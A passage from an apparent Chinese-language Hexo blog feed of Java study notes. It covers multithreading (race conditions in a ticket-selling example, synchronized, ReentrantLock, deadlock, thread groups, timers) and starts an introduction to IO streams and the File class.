class="string">&quot;thread-2&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>是一个接口，单继承多实现，可以继承别的类</li><li>线程之间数据共享，如上r，t1,t2实际上都会调用同一个对象的run方法</li></ul><h2 id="匿名内部类线程"><a href="#匿名内部类线程" class="headerlink" title="匿名内部类线程"></a>匿名内部类线程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Runnable r = <span class="keyword">new</span> Runnable() &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">100</span>; i++) &#123;</span><br><span class="line">System.out.println(Thread.currentThread().getName()+<span class="string">&quot;:&quot;</span>+i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Thread t = new Thread(r,&quot;InnerClassThrad&quot;);</span></span><br><span class="line"><span class="comment">//        t.start();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Thread(r,<span class="string">&quot;InnerClassThrad&quot;</span>).start();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Thread() &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">100</span>; i++) &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;:&quot;</span>+i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;.start();</span><br></pre></td></tr></table></figure><h1 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h1><h3 id="发现问题"><a href="#发现问题" class="headerlink" title="发现问题"></a>发现问题</h3><p>先举一个售票的例子</p><blockquote><p>四个售票场所共有100张票，使用多线程解决卖票</p></blockquote><ul><li>继承重写run方法类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TicketThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> count = <span class="number">100</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TicketThread</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TicketThread</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName()+<span class="string">&quot;卖出了第&quot;</span>+count+<span class="string">&quot;票&quot;</span>);</span><br><span class="line">                count--;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建四个线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Prctice</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        TicketThread t1 = <span class="keyword">new</span> TicketThread(<span class="string">&quot;售票点1&quot;</span>);</span><br><span class="line">        TicketThread t2 = <span class="keyword">new</span> TicketThread(<span class="string">&quot;售票点2&quot;</span>);</span><br><span class="line">        TicketThread t3 = <span class="keyword">new</span> TicketThread(<span class="string">&quot;售票点3&quot;</span>);</span><br><span class="line">        TicketThread t4 = <span class="keyword">new</span> TicketThread(<span class="string">&quot;售票点4&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        t3.start();</span><br><span class="line">        t4.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果（多运行几次就会这样）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">售票点1卖出了第100票</span><br><span class="line">售票点2卖出了第100票</span><br><span class="line">....</span><br></pre></td></tr></table></figure><blockquote><p>原因：多线程就是每个线程都在抢代码运行，以上面的例子，线程1在抢到输出后，count没有自减，然后线程2抢到了输出（此时count还是100），这就是线程不安全问题</p></blockquote><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>思想就是将代码上锁，将你需要执行的代码上“锁”，比如在执行2-3行代码时，先将这2-3行代码上锁，钥匙由线程来抢，这时其他线程没有钥匙，无法执行这2-3行代码，当抢得钥匙的线程执行完后将钥匙归还，这时再由线程抢钥匙来执行，这样就保证了线程安全，但在执行期间其他线程在等待就造成了效率问题</p><ul><li>代码部分</li></ul><p>继承Thread</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TicketThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> count = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object lock = <span class="keyword">new</span> Object();</span><br><span class="line">    <span class="comment">//对象不一样，锁必须一样</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TicketThread</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TicketThread</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">                <span class="keyword">if</span>(count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()+<span class="string">&quot;卖出了第&quot;</span>+count+<span class="string">&quot;票&quot;</span>);</span><br><span class="line">                    count--;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//加入延时使售票点更加随机</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现Runnable</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TicketRunnable</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">                <span class="comment">//this代表当前对象，对象一样锁也一样</span></span><br><span class="line">                <span class="keyword">if</span>(count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                    System.out.println(Thread.currentThread().getName()+<span class="string">&quot;卖出了第&quot;</span>+count+<span class="string">&quot;票&quot;</span>);</span><br><span class="line">                    count--;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h3><p>可以设置一个sycnhronized方法，将同步代码放在这个方法里面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h3><p>第二种锁</p><p>使用方法</p><ul><li><p>创建对象</p><p><code>ReentrantLock lock = new ReentrantLock();</code></p></li><li><p>加锁</p><p><code>lock.lock</code></p></li><li><p>解锁</p><p><code>lock.unlock</code></p></li></ul><p>为了防止加锁的代码异常无法解锁，通常要使用<code>try finally</code></p><blockquote><p>当有两个线程类访问同一数据时，可以在构造时传递一把锁，这样不同的类就能使用同一把锁了</p></blockquote><h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><p>一个门两把锁，线程1拿了一把锁，线程2拿了一把锁，最终导致谁都打不开门</p><h1 id="线程组"><a href="#线程组" class="headerlink" title="线程组"></a>线程组</h1><p>将线程进行统一管理</p><p>如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyThreadGroup</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">        ThreadGroup tg = <span class="keyword">new</span> ThreadGroup(<span class="string">&quot;线程组&quot;</span>);</span><br><span class="line">        MyRunnable r = <span class="keyword">new</span> MyRunnable();</span><br><span class="line">        </span><br><span class="line">        Thread t1 = <span class="keyword">new</span> Thread(tg, r);   </span><br><span class="line">        Thread t2 = <span class="keyword">new</span> Thread(tg, r);   </span><br><span class="line">        Thread t3 = <span class="keyword">new</span> Thread(tg, r);   </span><br><span class="line">        Thread t4 = <span class="keyword">new</span> Thread(tg, r);   </span><br><span class="line">        </span><br><span class="line">        tg.setDaemon(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Timer;</span><br><span class="line"><span class="keyword">import</span> java.util.TimerTask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestTimer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//定时器对象</span></span><br><span class="line">        Timer t = <span class="keyword">new</span> Timer();</span><br><span class="line">        <span class="comment">//安排</span></span><br><span class="line">        t.schedule(<span class="keyword">new</span> MyTimerTask(), <span class="number">2000</span>, <span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个定时任务类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTimerTask</span> <span class="keyword">extends</span> <span class="title">TimerTask</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是一个定时任务&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>理解IO流</title>
      <link href="/Programming/Java/day11_IO%E6%B5%81.html"/>
      <url>/Programming/Java/day11_IO%E6%B5%81.html</url>
      
        <content type="html"><![CDATA[<p> 操作文件就是IO</p><span id="more"></span><h2 id="IO流-1-0（文件操作）"><a href="#IO流-1-0（文件操作）" class="headerlink" title="IO流-1.0（文件操作）"></a>IO流-1.0（文件操作）</h2><p>也就是读取硬盘数据的操作，介绍一下文件</p><p>文件</p><ul><li>文件<ul><li>文本文件，二进制文件</li></ul></li><li>目录</li></ul><p>数据存放的地方</p><ul><li>运行的程序数据放在内存</li><li>照片，文档放在硬盘</li></ul><h3 id="什么是IO流"><a href="#什么是IO流" class="headerlink" title="什么是IO流"></a>什么是IO流</h3><ul><li>把数据从硬盘读取到内存==&gt;<code>I</code>流</li><li>把数据从内存存到硬盘==&gt;<code>O</code>流</li></ul><h3 id="File"><a href="#File" class="headerlink" title="File"></a>File</h3><p>File可以指向一个文件，也可以指向目录</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu3.file;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        File f1 = <span class="keyword">new</span> File(<span class="string">&quot;/home/manu&quot;</span>);</span><br><span class="line">        File f2 = <span class="keyword">new</span> File(<span class="string">&quot;/home/manu/Java/src/day1/Math.java&quot;</span>);</span><br><span class="line">        <span class="comment">//构造方法有很多，就不一一列举了</span></span><br><span class="line">        System.out.println(f1.isDirectory());</span><br><span class="line">        System.out.println(f1.isFile());</span><br><span class="line">        System.out.println(f2.isFile());</span><br><span class="line">        System.out.println(f2.exists());</span><br><span class="line">        System.out.println(f2.canRead());</span><br><span class="line">        System.out.println(f2.canWrite());</span><br><span class="line">        System.out.println(f2.canExecute());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建和删除</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File f1 = <span class="keyword">new</span> File(<span class="string">&quot;/home/manu/Java/Test.md&quot;</span>);</span><br><span class="line">        File f2 = <span class="keyword">new</span> File(<span class="string">&quot;/home/manu/Java/Test&quot;</span>);</span><br><span class="line">        f1.createNewFile();</span><br><span class="line">        f2.mkdir();</span><br><span class="line">        f2.mkdirs();<span class="comment">//创建多级目录</span></span><br><span class="line"><span class="comment">//        f1.delete();</span></span><br><span class="line">        f1.renameTo(<span class="keyword">new</span> File(<span class="string">&quot;/home/manu/Java/Test2.md&quot;</span>));</span><br><span class="line">        <span class="comment">//这个renameTo还可以移动文件，和linux的mv指令是真的像</span></span><br><span class="line">        f2.delete();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取一些信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File f1 = <span class="keyword">new</span> File(<span class="string">&quot;/home/manu/Java/Test2.md&quot;</span>);</span><br><span class="line">        File f2 = <span class="keyword">new</span> File(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line"><span class="comment">//        f2.createNewFile();</span></span><br><span class="line">        System.out.println(f1.getAbsolutePath());<span class="comment">//绝对路径</span></span><br><span class="line">        System.out.println(f2.getPath());<span class="comment">//相对路径</span></span><br><span class="line">        System.out.println(f1.getName());</span><br><span class="line">        System.out.println(f1.length());<span class="comment">//文件大小</span></span><br><span class="line">        System.out.println(f1.lastModified());<span class="comment">//获取最后修改时间，单位毫秒</span></span><br><span class="line">        System.out.println(f1.getParent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>list</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File dir = <span class="keyword">new</span> File(<span class="string">&quot;/home/manu/Java_learn_workspace/Learn02&quot;</span>);</span><br><span class="line">        String[] s = dir.list();</span><br><span class="line">        <span class="keyword">for</span>(String i : s) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">        File[] s2 = dir.listFiles();</span><br><span class="line">        <span class="keyword">for</span>(File i : s2) &#123;</span><br><span class="line">            System.out.println(i.getName());</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个题目，觉得挺有意思，放上来</p><p>1.复制文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu4.practice;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CopyFiles</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File source = <span class="keyword">new</span> File(<span class="string">&quot;/home/manu/Java/Test2.md&quot;</span>);</span><br><span class="line">        File target = <span class="keyword">new</span> File(<span class="string">&quot;/home/manu/Java/Test2&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        Files.copy(source.toPath(), target.toPath());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.递归查找文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu4.practice;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RTD</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">TraversalDiractory</span><span class="params">(File parentDir)</span> </span>&#123;</span><br><span class="line">        File[]  temp = parentDir.listFiles(); </span><br><span class="line">        <span class="keyword">for</span>(File file : temp) &#123;</span><br><span class="line">            <span class="keyword">if</span>(file.isFile()) &#123;</span><br><span class="line">                System.out.print(file.getName()+<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="keyword">for</span>(File file : temp) &#123;</span><br><span class="line">             <span class="keyword">if</span>(file.isDirectory()) &#123;</span><br><span class="line">                System.out.println(file.getPath()+<span class="string">&quot;  &quot;</span>);</span><br><span class="line">                TraversalDiractory(file.getAbsoluteFile());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="IO流-2-0（文件内容操作）"><a href="#IO流-2-0（文件内容操作）" class="headerlink" title="IO流-2.0（文件内容操作）"></a>IO流-2.0（文件内容操作）</h2><p>​    数据类型</p><ul><li>文本数据</li><li>二进制数据</li></ul><p>数据流</p><ul><li>字节流<ul><li>抽象基类：InputStream OutputStream</li></ul></li><li>字符流<ul><li>抽象基类：Reader Writer</li></ul></li></ul><h3 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h3><ul><li>默认没有缓冲区（代表频繁与硬盘交互，浪费性能）</li><li>操作一个字节</li></ul><h4 